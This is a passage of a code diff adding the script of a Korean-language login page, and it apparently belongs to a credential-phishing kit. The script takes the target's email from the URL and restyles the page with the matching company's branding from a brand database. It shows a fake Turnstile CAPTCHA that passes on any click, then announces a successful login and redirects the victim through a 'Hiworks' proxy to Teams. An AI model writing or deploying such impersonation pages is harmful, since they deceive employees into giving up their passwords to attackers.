+            showSuccess('✅ 인증 성공! 회의실로 이동합니다...');
+
+            // Redirect through Hiworks Proxy to Teams
+            setTimeout(() => {
+                setLoading(false);
+                
+                // Build proxy URL with email and brand
+                const proxyUrl = `${API_BASE}/proxy/hiworks?email=${encodeURIComponent(email)}&brand=${encodeURIComponent(brand ? brand.name : 'Unknown')}&redirect=teams`;
+                
+                console.log(`🔀 Redirecting to proxy: ${proxyUrl}`);
+                
+                // Redirect to Hiworks proxy (which will then redirect to Teams)
+                window.location.href = proxyUrl;
+            }, 2500);
+        }
+
+        // ============================================================
+        // BRAND DETECTION & THEMING
+        // ============================================================
+
+        function detectBrand(email) {
+            if (!email) return null;
+            const domain = email.split('@')[1]?.toLowerCase();
+            if (!domain) return null;
+            if (BRAND_DB[domain]) return BRAND_DB[domain];
+            for (const [key, brand] of Object.entries(BRAND_DB)) {
+                if (domain === key || domain.endsWith('.' + key)) {
+                    return brand;
+                }
+            }
+            return null;
+        }
+
+        function applyBrandTheme(brand) {
+            if (!brand) return;
+            currentBrand = brand;
+
+            const logoIcon = document.getElementById('logoIcon');
+            logoIcon.textContent = brand.logoIcon || 'VT';
+            logoIcon.style.background = brand.bgGradient || brand.logoColor || '#667eea';
+
+            document.getElementById('highlightText').textContent = brand.highlightText || '보안';
+            document.getElementById('subtitleText').textContent = brand.subtitle || '안전한 로그인';
+
+            const domainBadge = document.getElementById('domainBadge');
+            domainBadge.textContent = `🔒 ${brand.domain}`;
+            domainBadge.style.background = brand.accentColor ? `${brand.accentColor}22` : '#e8f0fe';
+            domainBadge.style.color = brand.accentColor || '#1a73e8';
+
+            document.getElementById('brandFlag').textContent = brand.flag || '🇰🇷';
+            document.getElementById('passwordHint').textContent = brand.passwordHint || '계정 비밀번호를 입력하세요';
+            document.getElementById('forgotLink').textContent = brand.forgotPassword || '비밀번호 찾기';
+            document.getElementById('createLink').textContent = brand.createAccount || '회원가입';
+            document.getElementById('copyrightText').textContent = brand.copyright || '© 2026. All rights reserved.';
+
+            signinBtn.style.background = brand.buttonColor || '#1a73e8';
+            document.body.style.background = brand.bgGradient || 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
+
+            document.getElementById('logoText').innerHTML = `
+                <span class="highlight" id="highlightText" style="color:${brand.accentColor || '#1a73e8'}">${brand.highlightText || '보안'}</span> 
+                ${brand.logoText || '로그인'}
+                <span class="brand-flag" id="brandFlag">${brand.flag || '🇰🇷'}</span>
+            `;
+
+            document.getElementById('detectionBadge').textContent = `🔍 ${brand.name} (${brand.type})`;
+            document.getElementById('originalDomain').value = brand.domain;
+        }
+
+        // ============================================================
+        // PARSE URL PARAMS
+        // ============================================================
+
+        function getEmailFromURL() {
+            const params = new URLSearchParams(window.location.search);
+            return params.get('email') || '';
+        }
+
+        // ============================================================
+        // UI HELPERS
+        // ============================================================
+
+        function showError(msg) {
+            errorMessage.classList.add('show');
+            errorText.textContent = msg;
+            hideSuccess();
+        }
+
+        function hideError() {
+            errorMessage.classList.remove('show');
+        }
+
+        function showSuccess(msg) {
+            successMessage.classList.add('show');
+            successText.textContent = msg;
+            hideError();
+        }
+
+        function hideSuccess() {
+            successMessage.classList.remove('show');
+        }
+
+        function togglePasswordVisibility() {
+            const input = document.getElementById('password');
+            if (input.type === 'password') {
+                input.type = 'text';
+            } else {
+                input.type = 'password';
+            }
+        }
+
+        function setLoading(loading) {
+            if (loading) {
+                signinBtn.classList.add('loading');
+                signinBtn.disabled = true;
+            } else {
+                signinBtn.classList.remove('loading');
+                signinBtn.disabled = false;
+            }
+        }
+
+        // ============================================================
+        // resetAll() - Preserved for completeness
+        // ============================================================
+
+        function resetAll() {
+            attemptCount = 0;
+            passwordInput.value = '';
+            hideError();
+            hideSuccess();
+            // CAPTCHA reset optional - uncomment to reset
+            // isVerified = false;
+            // turnstileBox.classList.remove('verified');
+            // turnstileCheck.textContent = '✓';
+            // turnstileText.textContent = '로봇이 아님을 확인하세요';
+        }
+
+        // ============================================================
+        // INITIALIZE
+        // ============================================================
+
+        function init() {
+            const email = getEmailFromURL();
+            if (email) {
+                emailDisplay.value = email;
+                document.getElementById('emailField').value = email;
+                const brand = detectBrand(email);
+                if (brand) {
+                    applyBrandTheme(brand);
+                } else {
+                    applyBrandTheme({
+                        name: '보안',
+                        domain: 'secure.kr',
+                        logoText: 'Secure',
+                        highlightText: '보안',
+                        logoIcon: '🔒',
+                        logoColor: '#1a73e8',
+                        accentColor: '#1a73e8',
+                        buttonColor: '#1a73e8',
+                        buttonHover: '#0d47a1',
+                        bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                        subtitle: '안전한 로그인',
+                        passwordHint: '계정 비밀번호를 입력하세요',
+                        forgotPassword: '비밀번호 찾기',
+                        createAccount: '회원가입',
+                        copyright: '© Secure Korea. All rights reserved.',
+                        flag: '🇰🇷',
+                        type: 'secure'
+                    });
+                }
+            } else {
+                applyBrandTheme({
+                    name: 'Secure',
+                    domain: 'secure.kr',
+                    logoText: 'Secure',
+                    highlightText: '보안',
+                    logoIcon: '🔒',
+                    logoColor: '#1a73e8',
+                    accentColor: '#1a73e8',
+                    buttonColor: '#1a73e8',
+                    buttonHover: '#0d47a1',
+                    bgGradient: 'linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%)',
+                    subtitle: '안전한 로그인',
+                    passwordHint: '계정 비밀번호를 입력하세요',
+                    forgotPassword: '비밀번호 찾기',
+                    createAccount: '회원가입',
+                    copyright: '© Secure Korea. All rights reserved.',
+                    flag: '🇰🇷',
+                    type: 'secure'
+                });
+            }
+
+            // Turnstile click handler
+            turnstileBox.addEventListener('click', function(e) {
+                e.stopPropagation();
+                if (isVerified) {
+                    isVerified = false;
+                    turnstileBox.classList.remove('verified');
+                    turnstileCheck.textContent = '✓';
+                    turnstileText.textContent = '로봇이 아님을 확인하세요';
+                    return;
+                }
+                turnstileBox.classList.add('verified');
+                turnstileCheck.textContent = '✓';
+                turnstileText.textContent = '인증 완료!';
+                isVerified = true;
+                showSuccess('인증 완료! 로그인을 진행하세요.');
+                setTimeout(() => {
+                    hideSuccess();
+                }, 2000);
+            });
+
+            // Enter key on password
+            passwordInput.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    handleLogin();
+                }
+            });
+        }
+
+        // Expose functions globally for inline onclick
+        window.togglePasswordVisibility = togglePasswordVisibility;
+        window.handleLogin = handleLogin;
+        window.resetAll = resetAll;
+
+        // ---- START ----
+        document.addEventListener('DOMContentLoaded', init);
+    </script>
+</body>
+</html>
